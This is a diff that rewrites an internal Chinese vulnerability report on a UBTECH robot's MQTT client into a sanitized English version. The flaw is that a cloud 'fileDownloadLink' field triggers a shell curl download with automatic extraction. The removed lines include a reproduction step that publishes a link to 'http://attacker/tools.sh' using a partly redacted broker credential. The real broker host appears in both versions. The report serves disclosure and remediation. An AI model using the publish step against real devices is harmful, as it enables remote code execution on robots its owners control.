@@ -1,117 +1,112 @@
 ---
-编号: UBH-021
-验证状态: 静态确认
-严重程度: 高
-披露状态: 内部研究
-源平台: 优必选人型
-源候选目录: mqtt-云端fileDownloadLink命令执行
+ID: UBH-021
+validation_status: statically confirmed
+severity: high
+disclosure_status: internal research
+source_platform: UBTECH Humanoid
+source_candidate_directory: mqtt-云端fileDownloadLink命令执行
 ---
-# UBH-021 V4 · MQTT 云端 `fileDownloadLink` → `system("curl -s -k -L")` 命令执行
+# UBH-021 V4 · MQTT Cloud `fileDownloadLink` Reaches a Shell-Based Download/Extraction Path
 
-## 1. 一句话结论
+## 1. Summary
 
-- \| 危害 \| **严重** — 消息含 `fileDownloadLink` 即触发 `system("curl -s -k -L <url> ...")` + 自动解压 → RCE \|
-- 1. 让机器人 `curl` 任意 URL（含内网 SSRF）
+- Impact: **Critical in the source report** — an MQTT message containing `fileDownloadLink` reaches a shell-based download path and automatic extraction.
+- The report statically confirms the processing chain and treats live external-broker interaction as out of bounds for routine verification.
 
-## 2. 影响产品与版本
+## 2. Affected Products and Versions
 
-- \| 组件 \| vision 板内置 MQTT 客户端（连云端 broker） \|
-- ## 复现要点（授权 + 可控 broker 环境）
+- Component: built-in MQTT client on the vision board, connected to a vendor cloud broker.
+- The path can direct the robot to retrieve attacker-selected URLs if an unauthorized party gains message-publishing authority to the subscribed topic.
 
-## 3. 验证状态
+## 3. Validation Status
 
-`静态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。
+`statically confirmed`. The source report did not publish a message to the external production broker.
 
-## 4. 攻击前提
+## 4. Attack Preconditions
 
-攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。
+An attacker would need authority to publish to the relevant MQTT topic, for example through broker compromise, credential exposure, or an improperly authorized integration. Verification must remain inside an authorized test environment.
 
-## 5. 根本原因
+## 5. Root Cause
 
-- 详见下方脱敏研究正文和材料清单。
+Cloud-originated message fields are passed into a shell-based download command and subsequent archive-processing logic without a sufficiently strong authentication boundary or safe argument construction.
 
-## 6. 攻击过程
+## 6. Attack Procedure
 
-源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。
+The retained probe extracts local broker/configuration evidence, confirms the binary strings associated with the download path, and constructs a representative message without transmitting it to the external broker.
 
-## 7. 实际影响
+## 7. Impact
 
-- \| 危害 \| **严重** — 消息含 `fileDownloadLink` 即触发 `system("curl -s -k -L <url> ...")` + 自动解压 → RCE \|
-- - 任何能向该 topic 下发消息者（broker 被攻破 / 凭据泄露 / 第三方接入）即可：
-- ## 红线 / 风险
+If an unauthorized sender can publish to the subscribed topic, the robot can be directed to retrieve arbitrary URLs, including internal resources, and to process downloaded archives. The source report treats this as a potential code-execution path depending on the downloaded content and extraction behavior.
 
-## 8. 复现方法
+## 8. Reproduction
 
-复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。
+See [Reproduction Material Manifest](复现/材料清单.md). The retained test does not connect to the external broker.
 
-## 9. 支撑证据
+## 9. Supporting Evidence
 
-见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。
+See [Evidence Material Manifest](证据/材料清单.md) and Section 13.
 
-## 10. 修复建议
+## 10. Recommendations
 
-- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
-- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
-- 删除硬编码凭据并轮换已暴露材料；
-- 对高风险服务降权，增加审计日志和负向回归测试。
+- Require per-device or per-principal MQTT authentication and narrowly scoped topic ACLs.
+- Remove hard-coded broker credentials and rotate exposed values.
+- Do not construct shell commands from message-supplied URLs; use a library API with explicit arguments.
+- Verify TLS certificates and restrict redirects/allowed download origins.
+- Treat downloaded archives as untrusted input and validate paths and signatures before extraction.
 
-## 11. 相关 AI 会话
+## 11. Related AI Sessions
 
-当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。
+No complete Claude Code session record has currently been identified that maps one-to-one to this report.
 
-## 12. 披露记录
+## 12. Disclosure Record
 
-- 当前披露状态：内部研究。
-- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。
+- Current disclosure status: internal research.
+- Before external disclosure, re-review broker identifiers, credentials, evidence, and vendor-coordination status.
 
-## 13. 脱敏后的原始研究正文
+## 13. Sanitized Original Research Body
 
-# V4 · MQTT 云端 `fileDownloadLink` → `system("curl -s -k -L")` 命令执行
+# V4 · MQTT Cloud `fileDownloadLink` Reaches a Shell-Based Download/Extraction Path
 
-| 项 | 值 |
+| Item | Value |
 |---|---|
-| 组件 | vision 板内置 MQTT 客户端（连云端 broker） |
-| 云端 broker | `upilotdev.uqirobot.com:21883` · 凭据 `uqirobot` / `<访问令牌_01>!@#` |
-| 危害 | **严重** — 消息含 `fileDownloadLink` 即触发 `system("curl -s -k -L <url> ...")` + 自动解压 → RCE |
-| 来源 | report_vision_core(1).md (V4) |
-| 复验 | 🔒 静态确认（红线：云端交互只读，不连外部 broker 下发） |
+| Component | Built-in MQTT client on the vision board |
+| Cloud Broker | `upilotdev.uqirobot.com:21883`; credential values are sanitized in the public artifact |
+| Impact | **Critical in the source report** — a message containing `fileDownloadLink` triggers the shell-based download path followed by automatic extraction |
+| Source | `report_vision_core(1).md` (V4) |
+| Re-verification | 🔒 Static confirmation only; external broker interaction remained read-only/out of scope |
 
-## 漏洞原理
-机器人 MQTT 客户端订阅云端 topic；收到含 `fileDownloadLink` 的消息后：
-```c
-system("curl -s -k -L <url> ...");   // -k 不校验 TLS, -L 跟随重定向
-// 随后自动解压下载文件
-```
-- **硬编码凭据**登录云端 broker（可被提取用于冒充/枚举 topic）
-- 任何能向该 topic 下发消息者（broker 被攻破 / 凭据泄露 / 第三方接入）即可：
-  1. 让机器人 `curl` 任意 URL（含内网 SSRF）
-  2. 下载 tar/zip → 自动解压 → 内含脚本则进一步执行
+## Vulnerability Mechanism
 
-## 利用脚本
+The robot's MQTT client subscribes to a cloud topic. When a message contains `fileDownloadLink`, the analyzed implementation invokes a shell-based `curl` path with redirect following and disabled TLS certificate verification, then automatically processes the downloaded archive.
+
+The source report identifies two security consequences if an unauthorized sender can publish to the topic:
+
+1. The robot can be instructed to fetch an arbitrary URL, including potentially internal network resources.
+2. Downloaded archive content is automatically processed, increasing the impact of an untrusted download.
+
+The broker credentials are stored locally in device configuration and can be extracted from firmware/device material. Their actual values remain sanitized in the repository.
+
+## Reproduction Script
+
 `scripts/exploit_mqtt.py`
 
-- 默认（安全）：
-  1. 读取设备端 `mqtt_client.json`（broker/凭据）
-  2. grep 二进制中 `fileDownloadLink` / `curl -s -k -L` / topic 证据
-  3. 构造恶意 MQTT 消息（`msgId / taskId / fileDownloadLink / version`）并展示
-- `--danger`：提示真实下发需连外部 broker（**默认拒绝**）。
+Safe default behavior:
 
-## 用法
-```
-python exploit_mqtt.py            # 设备侧证据 + 载荷构造
-python exploit_mqtt.py --danger   # 查看下发说明（不连外网）
-```
+1. Read the local `mqtt_client.json` configuration.
+2. Confirm `fileDownloadLink`, download-command, and topic-related evidence in the local binary.
+3. Construct and display a representative MQTT message without publishing it.
 
-## 证据输出
-- mqtt_client.json 内容（脱敏展示 broker/凭据来源）
-- 二进制内下载处理证据
-- 恶意消息 JSON
-- `evidence/` 目录留存
+The optional danger mode only explains the external publishing path; it does not connect to the production broker.
 
-## 红线 / 风险
-⚠️ 连接外部 broker（upilotdev.uqirobot.com）属云端交互；下发消息会触发设备下载/执行，
-**默认不做**。红线：OTA 云端 API 只读。
+## Evidence Output
 
-## 复现要点（授权 + 可控 broker 环境）
-用 paho-mqtt 以 `uqirobot/<访问令牌_01>!@#` 登录，向机器人订阅 topic 下发
-`{"fileDownloadLink":"http://attacker/tools.sh", ...}` → 设备执行 `curl -s -k -L`。
+- Sanitized broker/configuration provenance.
+- Binary-level download-handler evidence.
+- Representative message structure.
+- Supporting material retained under `evidence/`.
+
+## Safety Boundary
+
+⚠️ Connecting to and publishing on the external broker could cause a real robot to download/process remote content. The retained verification therefore does not perform that action.
+
+A fully authorized controlled-broker test would publish a benign message pointing to a harmless test artifact and observe whether the robot reaches the expected download path; that external action was not part of the retained evidence.
